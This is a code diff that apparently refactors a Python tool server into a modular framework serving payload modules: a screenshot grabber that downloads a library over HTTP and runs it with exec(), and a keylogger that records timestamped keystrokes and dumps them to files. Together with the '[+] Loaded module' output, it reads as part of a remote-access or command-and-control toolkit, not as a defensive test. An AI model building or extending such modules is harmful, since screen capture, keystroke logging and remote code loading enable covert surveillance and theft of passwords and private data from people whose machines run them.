@@ -7,11 +7,164 @@ import sys
 import os
 from datetime import datetime
 
-class TestToolServer:
+class BaseModule:
+    """Base class for all modules"""
     def __init__(self):
-        # In-memory MSS library implementation
-        self.libs = {
-            'mss': '''
+        self.name = "base"
+        self.description = "Base module"
+        self.author = "unknown"
+        self.version = "1.0"
+
+class ScreenshotModule(BaseModule):
+    def __init__(self):
+        super().__init__()
+        self.name = "screenshot"
+        self.description = "Capture screen"
+        self.author = "admin"
+        self.version = "1.0"
+        
+    def get_code(self):
+        return '''
+import sys
+import importlib.util
+import requests
+import base64
+import os
+from datetime import datetime
+
+def load_lib_from_server(lib_name):
+    try:
+        response = requests.get(f"http://127.0.0.1:8000/libs/{lib_name}.py")
+        if response.status_code == 200:
+            spec = importlib.util.spec_from_loader(lib_name, loader=None)
+            module = importlib.util.module_from_spec(spec)
+            sys.modules[lib_name] = module
+            exec(response.text, module.__dict__)
+            return module
+    except Exception as e:
+        print(f"Failed to load {lib_name}: {e}")
+    return None
+
+def capture():
+    try:
+        mss = load_lib_from_server('mss')
+        if not mss:
+            return "Failed to load mss library"
+            
+        os.makedirs('screenshots', exist_ok=True)
+            
+        with mss.mss() as sct:
+            monitor = sct.monitors[0]
+            screenshot = sct.grab(monitor)
+            png_bytes = sct.to_png(screenshot.rgb, screenshot.size)
+            
+            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+            filename = os.path.join('screenshots', f'screenshot-{timestamp}.png')
+            
+            with open(filename, 'wb') as f:
+                f.write(png_bytes)
+            
+            return f"Screenshot saved as {filename}"
+            
+    except Exception as e:
+        import traceback
+        return f"Screenshot failed: {str(e)}\\n{traceback.format_exc()}"
+'''
+
+class KeyloggerModule(BaseModule):
+    def __init__(self):
+        super().__init__()
+        self.name = "keylogger"
+        self.description = "Capture keystrokes"
+        self.author = "admin"
+        self.version = "1.0"
+        
+    def get_code(self):
+        return '''
+import threading
+import os
+from datetime import datetime
+
+class Keylogger:
+    def __init__(self):
+        self.log = []
+        self.running = False
+        self._lock = threading.Lock()
+        
+    def start(self):
+        if not self.running:
+            self.running = True
+            self.log = []
+            return True
+        return False
+        
+    def stop(self):
+        if self.running:
+            self.running = False
+            return True
+        return False
+        
+    def add_keystroke(self, key):
+        if self.running:
+            with self._lock:
+                self.log.append((datetime.now(), key))
+                
+    def get_log(self):
+        with self._lock:
+            return self.log.copy()
+
+_keylogger = None
+
+def start_keylogger():
+    global _keylogger
+    _keylogger = Keylogger()
+    return _keylogger.start()
+
+def stop_keylogger():
+    global _keylogger
+    if _keylogger:
+        return _keylogger.stop()
+    return False
+
+def dump_logs():
+    global _keylogger
+    if _keylogger:
+        logs = _keylogger.get_log()
+        if logs:
+            log_text = "\\n".join(f"{ts}: {key}" for ts, key in logs)
+            
+            # Save to file
+            os.makedirs('keylogs', exist_ok=True)
+            filename = os.path.join('keylogs', f'keylog-{datetime.now().strftime("%Y%m%d-%H%M%S")}.txt')
+            with open(filename, 'w') as f:
+                f.write(log_text)
+                
+            return f"Keylog saved to {filename}\\n{log_text}"
+    return "No logs available"
+'''
+
+class ModuleManager:
+    def __init__(self):
+        self.modules = {}
+        self.libs = {}
+        self.load_modules()
+        self.load_libs()
+        
+    def load_modules(self):
+        # Initialize all modules
+        modules = [
+            ScreenshotModule(),
+            KeyloggerModule(),
+            # Add more modules here
+        ]
+        
+        for module in modules:
+            self.modules[module.name] = module.get_code()
+            print(f"[+] Loaded module: {module.name} v{module.version}")
+            
+    def load_libs(self):
+        # MSS library implementation
+        self.libs['mss'] = '''
 import ctypes
 import sys
 import zlib
@@ -137,66 +290,22 @@ class MSS:
 
 def mss(): return MSS()
 '''
-        }
-
-        # Screenshot tool implementation
-        self.tools = {
-            'screenshot': '''
-import sys
-import importlib.util
-import requests
-import base64
-import os
-from datetime import datetime
-
-def load_lib_from_server(lib_name):
-    try:
-        response = requests.get(f"http://127.0.0.1:8000/libs/{lib_name}.py")
-        if response.status_code == 200:
-            spec = importlib.util.spec_from_loader(lib_name, loader=None)
-            module = importlib.util.module_from_spec(spec)
-            sys.modules[lib_name] = module
-            exec(response.text, module.__dict__)
-            return module
-    except Exception as e:
-        print(f"Failed to load {lib_name}: {e}")
-    return None
-
-def capture():
-    try:
-        mss = load_lib_from_server('mss')
-        if not mss:
-            return "Failed to load mss library"
-            
-        # Create screenshots directory if it doesn't exist
-        os.makedirs('screenshots', exist_ok=True)
-            
-        with mss.mss() as sct:
-            monitor = sct.monitors[0]
-            screenshot = sct.grab(monitor)
-            png_bytes = sct.to_png(screenshot.rgb, screenshot.size)
-            
-            # Generate filename with timestamp
-            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
-            filename = os.path.join('screenshots', f'screenshot-{timestamp}.png')
-            
-            # Save the PNG file
-            with open(filename, 'wb') as f:
-                f.write(png_bytes)
-            
-            return f"Screenshot saved as {filename}"
-            
-    except Exception as e:
-        import traceback
-        return f"Screenshot failed: {str(e)}\\n{traceback.format_exc()}"
-'''
-        }
-
+        
     def get_tool(self, tool_name):
-        return self.tools.get(tool_name)
-
+        return self.modules.get(tool_name)
+        
     def get_lib(self, lib_name):
         return self.libs.get(lib_name)
+
+class TestToolServer:
+    def __init__(self):
+        self.module_manager = ModuleManager()
+        
+    def get_tool(self, tool_name):
+        return self.module_manager.get_tool(tool_name)
+        
+    def get_lib(self, lib_name):
+        return self.module_manager.get_lib(lib_name)
 
 class TestServer:
     def __init__(self, host='127.0.0.1', port=5555):
